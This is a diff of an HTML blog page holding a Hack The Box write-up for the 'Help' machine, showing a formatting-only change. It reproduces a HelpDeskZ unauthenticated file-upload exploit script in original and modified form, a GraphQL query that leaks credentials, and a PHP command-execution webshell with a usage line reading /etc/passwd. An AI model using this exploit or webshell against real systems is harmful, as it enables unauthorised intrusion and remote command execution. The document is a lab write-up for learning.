@@ -83,22 +83,22 @@
 
 <h2 id="quick-summary">Quick Summary</h2>
 <p><br> Hey guys today Help retired and here’s my write-up about it. Help was a nice easy machine, I don’t really have much to say about it. To get an initial shell on the box we will exploit a non-authenticated file upload vulnerability in a web application called <code class="highlighter-rouge">HelpDeskZ</code>. This vulnerability could be exploited in two ways either by editing the exploit to include a higher range or by getting credentials to the web app and editing some settings to make the exploit work. After getting a shell the privilege escalation part is just a kernel exploit. It’s a Linux box and its ip is <code class="highlighter-rouge">10.10.10.121</code> I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">help.htb</code>. Let’s jump right in !
-<img src="/images/hackthebox/help/0.png" alt=""></p>
+<br><img src="/images/hackthebox/help/0.png" alt=""><br></p>
 <hr>
 
 <h2 id="nmap">Nmap</h2>
 <p><br> As always we will start with <code class="highlighter-rouge">nmap</code> to scan for open ports and services :
-<code class="highlighter-rouge">nmap -sV -sT -sC help.htb</code>
-<img src="/images/hackthebox/help/1.png" alt="">
+<br><code class="highlighter-rouge">nmap -sV -sT -sC help.htb</code>
+<br><img src="/images/hackthebox/help/1.png" alt=""><br>
 <br> We got <code class="highlighter-rouge">ssh</code> on port 22 and <code class="highlighter-rouge">http</code> on two ports : 80 and 3000. What’s running on port 80 is an <code class="highlighter-rouge">Apache2</code> server and on port 3000 is <code class="highlighter-rouge">Node.js Express Framework</code>.
 <br></p>
 <hr>
 
 <h2 id="http-initial-enumeration">HTTP Initial Enumeration</h2>
 <p><br> On port 80 there’s just the default <code class="highlighter-rouge">Apache</code> index page :
-<img src="/images/hackthebox/help/2.png" alt="">
+<br><img src="/images/hackthebox/help/2.png" alt=""><br>
 <br> So I ran <code class="highlighter-rouge">gobuster</code> and got these results :
-<code class="highlighter-rouge">gobuster -u http://help.htb/ -w /usr/share/wordlists/dirb/common.txt</code></p>
+<br><code class="highlighter-rouge">gobuster -u http://help.htb/ -w /usr/share/wordlists/dirb/common.txt</code></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>=====================================================
 Gobuster v2.0.0              OJ Reeves (@TheColonial)
 =====================================================
@@ -123,7 +123,7 @@ Gobuster v2.0.0              OJ Reeves (@TheColonial)
 =====================================================
 </code></pre></div></div>
 <p><br> I went to <code class="highlighter-rouge">/support</code> and there was a web application called <code class="highlighter-rouge">HelpDeskZ</code> :
-<img src="/images/hackthebox/help/3.png" alt=""></p>
+<br><img src="/images/hackthebox/help/3.png" alt=""><br></p>
 <hr>
 
 <h2 id="file-upload-vulnerability">File Upload Vulnerability</h2>
@@ -135,103 +135,99 @@ The software in the default configuration allows upload for .php-Files ( !! ). I
 </blockquote>
 
 <p><br> I wanted to test if I can really upload <code class="highlighter-rouge">php</code> so I went to <code class="highlighter-rouge">Submit a Ticket</code> and I attached a test file :
-<img src="/images/hackthebox/help/4.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/help/5.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/help/6.png" alt="">
+<br><img src="/images/hackthebox/help/4.png" alt=""><br>
+<br><img src="/images/hackthebox/help/5.png" alt=""><br>
+<br><img src="/images/hackthebox/help/6.png" alt=""><br>
 <br> And I got <code class="highlighter-rouge">File is not allowed.</code>
 <br> Luckily <code class="highlighter-rouge">HelpDeskZ</code> is an open-source application so I checked the source on <a href="https://github.com/evolutionscript/HelpDeskZ-1.0" target="_blank" rel="noopener noreferrer">github</a>. 
 <br> The script that handles tickets submissions is called <a href="https://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/includes/parser/new_ticket.php" target="_blank" rel="noopener noreferrer"><code class="highlighter-rouge">new-ticket.php</code></a>. It can be found in <code class="highlighter-rouge">includes/parser</code>. 
 <br> Here’s the part for the attachments :
-<img src="/images/hackthebox/help/7.png" alt=""></p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if(is_array($attachments)){
-		$save_dir = UPLOAD_DIR;
-		foreach($attachments as $attachment) {
-		  // get the attachment name
-		  $filename = $attachment-&gt;filename;
-		  // write the file to the directory you want to save it in
-		  if ($fp = fopen($save_dir.$filename, 'w')) {
-			while($bytes = $attachment-&gt;read()) {
-			  fwrite($fp, $bytes);
-			}
-			fclose($fp);
-		  }
+<br><img src="/images/hackthebox/help/7.png" alt=""><br></p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$attachments</span><span class="p">)){</span>
+		<span class="nv">$save_dir</span> <span class="o">=</span> <span class="nx">UPLOAD_DIR</span><span class="p">;</span>
+		<span class="k">foreach</span><span class="p">(</span><span class="nv">$attachments</span> <span class="k">as</span> <span class="nv">$attachment</span><span class="p">)</span> <span class="p">{</span>
+		  <span class="c1">// get the attachment name
+</span>		  <span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$attachment</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">;</span>
+		  <span class="c1">// write the file to the directory you want to save it in
+</span>		  <span class="k">if</span> <span class="p">(</span><span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$save_dir</span><span class="o">.</span><span class="nv">$filename</span><span class="p">,</span> <span class="s1">'w'</span><span class="p">))</span> <span class="p">{</span>
+			<span class="k">while</span><span class="p">(</span><span class="nv">$bytes</span> <span class="o">=</span> <span class="nv">$attachment</span><span class="o">-&gt;</span><span class="na">read</span><span class="p">())</span> <span class="p">{</span>
+			  <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$bytes</span><span class="p">);</span>
+			<span class="p">}</span>
+			<span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
+		  <span class="p">}</span>
 			
-		  $filesize = @filesize(UPLOAD_DIR.$filename);
-		  if($filesize){
-			  $fileinfo = array('name' =&gt; $filename, 'size' =&gt; $filesize);
-			  $fileverification = verifyAttachment($fileinfo);
-			  if($fileverification['msg_code'] == 0){
-				$ext = pathinfo($filename, PATHINFO_EXTENSION);
-				$filename_encoded = md5($filename.time()).".".$ext;
-				$data = array('name' =&gt; $filename, 'enc' =&gt; $filename_encoded, 'filesize' =&gt; $filesize, 'ticket_id' =&gt; $ticketid, 'msg_id' =&gt; $message_id, 'filetype' =&gt; $attachment-&gt;content_type);
-				$db-&gt;insert(TABLE_PREFIX."attachments", $data);
-				rename(UPLOAD_DIR.$filename, UPLOAD_DIR.'tickets/'.$filename_encoded);
-			  }else{
-				unlink(UPLOAD_DIR.$filename);
-			  }
-		  }
-		}
+		  <span class="nv">$filesize</span> <span class="o">=</span> <span class="o">@</span><span class="nb">filesize</span><span class="p">(</span><span class="nx">UPLOAD_DIR</span><span class="o">.</span><span class="nv">$filename</span><span class="p">);</span>
+		  <span class="k">if</span><span class="p">(</span><span class="nv">$filesize</span><span class="p">){</span>
+			  <span class="nv">$fileinfo</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'name'</span> <span class="o">=&gt;</span> <span class="nv">$filename</span><span class="p">,</span> <span class="s1">'size'</span> <span class="o">=&gt;</span> <span class="nv">$filesize</span><span class="p">);</span>
+			  <span class="nv">$fileverification</span> <span class="o">=</span> <span class="nx">verifyAttachment</span><span class="p">(</span><span class="nv">$fileinfo</span><span class="p">);</span>
+			  <span class="k">if</span><span class="p">(</span><span class="nv">$fileverification</span><span class="p">[</span><span class="s1">'msg_code'</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
+				<span class="nv">$ext</span> <span class="o">=</span> <span class="nb">pathinfo</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nx">PATHINFO_EXTENSION</span><span class="p">);</span>
+				<span class="nv">$filename_encoded</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$filename</span><span class="o">.</span><span class="nb">time</span><span class="p">())</span><span class="o">.</span><span class="s2">"."</span><span class="o">.</span><span class="nv">$ext</span><span class="p">;</span>
+				<span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'name'</span> <span class="o">=&gt;</span> <span class="nv">$filename</span><span class="p">,</span> <span class="s1">'enc'</span> <span class="o">=&gt;</span> <span class="nv">$filename_encoded</span><span class="p">,</span> <span class="s1">'filesize'</span> <span class="o">=&gt;</span> <span class="nv">$filesize</span><span class="p">,</span> <span class="s1">'ticket_id'</span> <span class="o">=&gt;</span> <span class="nv">$ticketid</span><span class="p">,</span> <span class="s1">'msg_id'</span> <span class="o">=&gt;</span> <span class="nv">$message_id</span><span class="p">,</span> <span class="s1">'filetype'</span> <span class="o">=&gt;</span> <span class="nv">$attachment</span><span class="o">-&gt;</span><span class="na">content_type</span><span class="p">);</span>
+				<span class="nv">$db</span><span class="o">-&gt;</span><span class="na">insert</span><span class="p">(</span><span class="nx">TABLE_PREFIX</span><span class="o">.</span><span class="s2">"attachments"</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
+				<span class="nb">rename</span><span class="p">(</span><span class="nx">UPLOAD_DIR</span><span class="o">.</span><span class="nv">$filename</span><span class="p">,</span> <span class="nx">UPLOAD_DIR</span><span class="o">.</span><span class="s1">'tickets/'</span><span class="o">.</span><span class="nv">$filename_encoded</span><span class="p">);</span>
+			  <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+				<span class="nb">unlink</span><span class="p">(</span><span class="nx">UPLOAD_DIR</span><span class="o">.</span><span class="nv">$filename</span><span class="p">);</span>
+			  <span class="p">}</span>
+		  <span class="p">}</span>
+		<span class="p">}</span>
 </code></pre></div></div>
 <p><br> It takes the file and uploads it then there’s an <code class="highlighter-rouge">if</code> statement that checks the result of passing <code class="highlighter-rouge">$fileinfo</code> to a function called <code class="highlighter-rouge">verifyAttachment</code>. If the function returned <code class="highlighter-rouge">0</code> it will rename the file. If it’s not <code class="highlighter-rouge">0</code> it will delete the file (<code class="highlighter-rouge">unlink(UPLOAD_DIR.$filename)</code>) . This function can be found in <a href="https://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/includes/functions.php" target="_blank" rel="noopener noreferrer"><code class="highlighter-rouge">functions.php</code></a> in <code class="highlighter-rouge">includes/</code>. 
 <code class="highlighter-rouge">verifyAttachment()</code> :
-<img src="/images/hackthebox/help/8.png" alt=""></p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function verifyAttachment($filename){
-	global $db;	
-	$namepart = explode('.', $filename['name']);
-	$totalparts = count($namepart)-1;
-	$file_extension = $namepart[$totalparts];
-	if(!ctype_alnum($file_extension)){
-		$msg_code = 1;
-	}else{
-		$filetype = $db-&gt;fetchRow("SELECT count(id) AS total, size FROM ".TABLE_PREFIX."file_types WHERE type='".$db-&gt;real_escape_string($file_extension)."'");
-		if($filetype['total'] == 0){
-			$msg_code = 2;
-		}elseif($filename['size'] &gt; $filetype['size'] &amp;&amp; $filetype['size'] &gt; 0){
-			$msg_code = 3;
-			$misc = formatBytes($filetype['size']);
-		}else{	
-			$msg_code = 0;
-		}
-	}
-	$data = array('msg_code' =&gt; $msg_code, 'msg_extra' =&gt; $misc);
-	return $data;
-}
+<br><img src="/images/hackthebox/help/8.png" alt=""><br></p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="nf">verifyAttachment</span><span class="p">(</span><span class="nv">$filename</span><span class="p">){</span>
+	<span class="k">global</span> <span class="nv">$db</span><span class="p">;</span>	
+	<span class="nv">$namepart</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">'.'</span><span class="p">,</span> <span class="nv">$filename</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]);</span>
+	<span class="nv">$totalparts</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$namepart</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+	<span class="nv">$file_extension</span> <span class="o">=</span> <span class="nv">$namepart</span><span class="p">[</span><span class="nv">$totalparts</span><span class="p">];</span>
+	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">ctype_alnum</span><span class="p">(</span><span class="nv">$file_extension</span><span class="p">)){</span>
+		<span class="nv">$msg_code</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+	<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+		<span class="nv">$filetype</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">fetchRow</span><span class="p">(</span><span class="s2">"SELECT count(id) AS total, size FROM "</span><span class="o">.</span><span class="nx">TABLE_PREFIX</span><span class="o">.</span><span class="s2">"file_types WHERE type='"</span><span class="o">.</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">real_escape_string</span><span class="p">(</span><span class="nv">$file_extension</span><span class="p">)</span><span class="o">.</span><span class="s2">"'"</span><span class="p">);</span>
+		<span class="k">if</span><span class="p">(</span><span class="nv">$filetype</span><span class="p">[</span><span class="s1">'total'</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
+			<span class="nv">$msg_code</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+		<span class="p">}</span><span class="k">elseif</span><span class="p">(</span><span class="nv">$filename</span><span class="p">[</span><span class="s1">'size'</span><span class="p">]</span> <span class="o">&gt;</span> <span class="nv">$filetype</span><span class="p">[</span><span class="s1">'size'</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$filetype</span><span class="p">[</span><span class="s1">'size'</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
+			<span class="nv">$msg_code</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
+			<span class="nv">$misc</span> <span class="o">=</span> <span class="nx">formatBytes</span><span class="p">(</span><span class="nv">$filetype</span><span class="p">[</span><span class="s1">'size'</span><span class="p">]);</span>
+		<span class="p">}</span><span class="k">else</span><span class="p">{</span>	
+			<span class="nv">$msg_code</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+	<span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'msg_code'</span> <span class="o">=&gt;</span> <span class="nv">$msg_code</span><span class="p">,</span> <span class="s1">'msg_extra'</span> <span class="o">=&gt;</span> <span class="nv">$misc</span><span class="p">);</span>
+	<span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
+<span class="p">}</span>
 </code></pre></div></div>
 <p><br> This function runs several checks on the file, but interestingly it doesn’t check for allowed file extensions. This means that if the file passed these checks the function will return <code class="highlighter-rouge">0</code> and the file will be renamed and successfully uploaded no matter what’s the extension of that file and the message that says : <code class="highlighter-rouge">File is not allowed.</code> is meaningless. 
 <br> If we take a look at how the application renames files it gets the md5 hash of the filename concatenated with the time of upload then it concatenates that hash with the original file extension. And that’s how the exploit finds the uploaded file. But there’s a small problem about time, running the exploit on our box would use our local time. If the timezone of the web app is different from the timezone of our box the exploit will fail to find the file because it will use a wrong time. 
 <br> If we take a look at the exploit :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import hashlib
-import time
-import sys
-import requests
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">requests</span>
 
-print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'
+<span class="k">print</span> <span class="s">'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'</span>
 
-if len(sys.argv) &lt; 3:
-    print "Usage: {} [baseUrl] [nameOfUploadedFile]".format(sys.argv[0])
-    sys.exit(1)
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
+    <span class="k">print</span> <span class="s">"Usage: {} [baseUrl] [nameOfUploadedFile]"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 
-helpdeskzBaseUrl = sys.argv[1]
-fileName = sys.argv[2]
+<span class="n">helpdeskzBaseUrl</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">fileName</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
 
-currentTime = int(time.time())
+<span class="n">currentTime</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
 
-for x in range(0, 300):
-    plaintext = fileName + str(currentTime - x)
-    md5hash = hashlib.md5(plaintext).hexdigest()
+<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">300</span><span class="p">):</span>
+    <span class="n">plaintext</span> <span class="o">=</span> <span class="n">fileName</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">currentTime</span> <span class="o">-</span> <span class="n">x</span><span class="p">)</span>
+    <span class="n">md5hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">plaintext</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
 
-    url = helpdeskzBaseUrl+md5hash+'.php'
-    response = requests.head(url)
-    if response.status_code == 200:
-        print "found!"
-        print url
-        sys.exit(0)
+    <span class="n">url</span> <span class="o">=</span> <span class="n">helpdeskzBaseUrl</span><span class="o">+</span><span class="n">md5hash</span><span class="o">+</span><span class="s">'.php'</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">head</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s">"found!"</span>
+        <span class="k">print</span> <span class="n">url</span>
+        <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
 
-print "Sorry, I did not find anything"
+<span class="k">print</span> <span class="s">"Sorry, I did not find anything"</span>
 </code></pre></div></div>
 <p><br> We can solve this problem by iterating over a higher range than 300 : <code class="highlighter-rouge">for x in range(0, 300)</code>
 <br> This will make it try different hashes according to different times until it finds the file, you can call it a bruteforce attack. That will be easy let’s look at another solution. Another solution is to get credentials to login to the web app and edit the timezone in the settings to make it the same as ours. 
@@ -240,114 +236,115 @@ print "Sorry, I did not find anything"
 
 <h2 id="nodejs-getting-credentials">Node.js, Getting Credentials</h2>
 <p><br> We saw earlier that port 3000 was open and running <code class="highlighter-rouge">Node.js Express framework</code> and we haven’t looked at that yet. 
-<img src="/images/hackthebox/help/9.png" alt="">
+<br><img src="/images/hackthebox/help/9.png" alt=""><br>
 <br> By going to <code class="highlighter-rouge">http://help.htb:3000/</code> I got this response of a message saying : <code class="highlighter-rouge">"Hi Shiv, To get access please find the credentials with given query"</code>, I tried <code class="highlighter-rouge">/test</code> and got this :
-<img src="/images/hackthebox/help/10.png" alt="">
+<br><img src="/images/hackthebox/help/10.png" alt=""><br>
 <br> tbh the next step involved a lot of guessing/fuzzing with custom wordlists and random things based on google searches about <code class="highlighter-rouge">node.js</code>, <code class="highlighter-rouge">node.js</code> queries and other related stuff. After a lot of attempts to find something when I tried <code class="highlighter-rouge">/graphql</code> I got this response :
-<img src="/images/hackthebox/help/11.png" alt="">
-<br> So I added <code class="highlighter-rouge">?query</code> : <code class="highlighter-rouge">http://help.htb:3000/graphql?query</code> and got a syntax error :
-<img src="/images/hackthebox/help/12.png" alt="">
-<br> That’s fine, I tried requesting a query, for example <code class="highlighter-rouge">user</code> : <code class="highlighter-rouge">http://help.htb:3000/graphql?query={user}</code> :
-<img src="/images/hackthebox/help/13.png" alt="">
-<br> It says that <code class="highlighter-rouge">user</code> must have a selection of subfields so I tried <code class="highlighter-rouge">username</code> : <code class="highlighter-rouge">http://help.htb:3000/graphql?query={user{username}}</code> :
-<img src="/images/hackthebox/help/14.png" alt="">
-<br> Great, let’s get the password : <code class="highlighter-rouge">http://help.htb:3000/graphql?query={user{password}}</code> :
-<img src="/images/hackthebox/help/15.png" alt="">
+<br><img src="/images/hackthebox/help/11.png" alt=""><br>
+<br> So I added <code class="highlighter-rouge">?query</code> and got a syntax error :
+<br><code class="highlighter-rouge">http://help.htb:3000/graphql?query</code>
+<br><img src="/images/hackthebox/help/12.png" alt=""><br>
+<br> That’s fine, I tried requesting a query, for example <code class="highlighter-rouge">user</code> :
+<br><code class="highlighter-rouge">http://help.htb:3000/graphql?query={user}</code> :
+<br><img src="/images/hackthebox/help/13.png" alt=""><br>
+<br> It says that <code class="highlighter-rouge">user</code> must have a selection of subfields so I tried <code class="highlighter-rouge">username</code> :
+<br><code class="highlighter-rouge">http://help.htb:3000/graphql?query={user{username}}</code> :
+<br><img src="/images/hackthebox/help/14.png" alt=""><br>
+<br> Great, let’s get the password : 
+<br><code class="highlighter-rouge">http://help.htb:3000/graphql?query={user{password}}</code> :
+<br><img src="/images/hackthebox/help/15.png" alt=""><br>
 <br> I used <a href="https://crackstation.net/" target="_blank" rel="noopener noreferrer">crackstation</a> to crack the hash and got this password : 
-<code class="highlighter-rouge">5d3c93182bb20f07b994a7f617e99cff</code> : <code class="highlighter-rouge">godhelpmeplz</code>
+<br><code class="highlighter-rouge">5d3c93182bb20f07b994a7f617e99cff</code> : <code class="highlighter-rouge">godhelpmeplz</code>
 <br> Now we have the credentials : <code class="highlighter-rouge">helpme@helpme.com : godhelpmeplz</code>
 <br></p>
 <hr>
 
 <h2 id="file-upload-exploitation-reverse-shell-and-user-flag">File Upload Exploitation, Reverse Shell and User Flag</h2>
 <p><br> I edited the path of the uploads in the exploit, instead of <code class="highlighter-rouge">helpdeskzBaseUrl+md5hash+'.php'</code> I made it :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>helpdeskzBaseUrl+'/uploads/tickets/'+md5hash+'.php'
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">helpdeskzBaseUrl</span><span class="o">+</span><span class="s">'/uploads/tickets/'</span><span class="o">+</span><span class="n">md5hash</span><span class="o">+</span><span class="s">'.php'</span>
 </code></pre></div></div>
-<p><br>I got that path from the <a href="https://github.com/evolutionscript/HelpDeskZ-1.0" target="_blank" rel="noopener noreferrer">github repository</a>). Exploit after edits :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import hashlib
-import time
-import sys
-import requests
+<p><br>I got that path from the <a href="https://github.com/evolutionscript/HelpDeskZ-1.0" target="_blank" rel="noopener noreferrer">github repository</a>).
+<br>Exploit after edits :</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">requests</span>
 
-print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'
+<span class="k">print</span> <span class="s">'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'</span>
 
-if len(sys.argv) &lt; 3:
-    print "Usage: {} [baseUrl] [nameOfUploadedFile]".format(sys.argv[0])
-    sys.exit(1)
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
+    <span class="k">print</span> <span class="s">"Usage: {} [baseUrl] [nameOfUploadedFile]"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 
-helpdeskzBaseUrl = sys.argv[1]
-fileName = sys.argv[2]
+<span class="n">helpdeskzBaseUrl</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">fileName</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
 
-currentTime = int(time.time())
+<span class="n">currentTime</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
 
-for x in range(0, 300):
-    plaintext = fileName + str(currentTime - x)
-    md5hash = hashlib.md5(plaintext).hexdigest()
+<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">300</span><span class="p">):</span>
+    <span class="n">plaintext</span> <span class="o">=</span> <span class="n">fileName</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">currentTime</span> <span class="o">-</span> <span class="n">x</span><span class="p">)</span>
+    <span class="n">md5hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">plaintext</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
 
-    url = helpdeskzBaseUrl+'/uploads/tickets/'+md5hash+'.php'
-    response = requests.head(url)
-    if response.status_code == 200:
-        print "found!"
-        print url
-        sys.exit(0)
+    <span class="n">url</span> <span class="o">=</span> <span class="n">helpdeskzBaseUrl</span><span class="o">+</span><span class="s">'/uploads/tickets/'</span><span class="o">+</span><span class="n">md5hash</span><span class="o">+</span><span class="s">'.php'</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">head</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s">"found!"</span>
+        <span class="k">print</span> <span class="n">url</span>
+        <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
 
-print "Sorry, I did not find anything"
+<span class="k">print</span> <span class="s">"Sorry, I did not find anything"</span>
 </code></pre></div></div>
 <p><br> I went to the settings and changed the timezone to the same timezone as mine :
-<img src="/images/hackthebox/help/16.png" alt="">
+<br><img src="/images/hackthebox/help/16.png" alt=""><br>
 <br> The <code class="highlighter-rouge">php</code> file I’m going to upload is <code class="highlighter-rouge">simple-backdoor.php</code> which can be found in <code class="highlighter-rouge">/usr/share/webshells/php/simple-backdoor.php</code> in <code class="highlighter-rouge">kali</code> :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&gt;
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&gt;</span>
 
-&lt;?php
+<span class="cp">&lt;?php</span>
 
-if(isset($_REQUEST['cmd'])){
-        echo "&lt;pre&gt;";
-        $cmd = ($_REQUEST['cmd']);
-        system($cmd);
-        echo "&lt;/pre&gt;";
-        die;
-}
+<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])){</span>
+        <span class="k">echo</span> <span class="s2">"&lt;pre&gt;"</span><span class="p">;</span>
+        <span class="nv">$cmd</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span>
+        <span class="nb">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
+        <span class="k">echo</span> <span class="s2">"&lt;/pre&gt;"</span><span class="p">;</span>
+        <span class="k">die</span><span class="p">;</span>
+<span class="p">}</span>
 
-?&gt;
+<span class="cp">?&gt;</span>
 
 Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
 
-&lt;!--    http://michaeldaw.org   2006    --&gt;
+<span class="c">&lt;!--    http://michaeldaw.org   2006    --&gt;</span>
 </code></pre></div></div>
 <p><br> I submitted the ticket :
-<img src="/images/hackthebox/help/17.png" alt="">
+<br><img src="/images/hackthebox/help/17.png" alt=""><br>
 <br> Then I ran the exploit and it found the file immediately :
-<code class="highlighter-rouge">python exploit.py http://10.10.10.121/support/ rick.php</code>
-<img src="/images/hackthebox/help/18.png" alt="">
-<br></p>
+<br><code class="highlighter-rouge">python exploit.py http://10.10.10.121/support/ rick.php</code>
+<br><img src="/images/hackthebox/help/18.png" alt=""></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://help.htb/support/uploads/tickets/11559b997fcb9a724cbc0e2a6a4b98a3.php
 </code></pre></div></div>
-<p><img src="/images/hackthebox/help/19.png" alt="">
-<br></p>
+<p><br><img src="/images/hackthebox/help/19.png" alt=""></p>
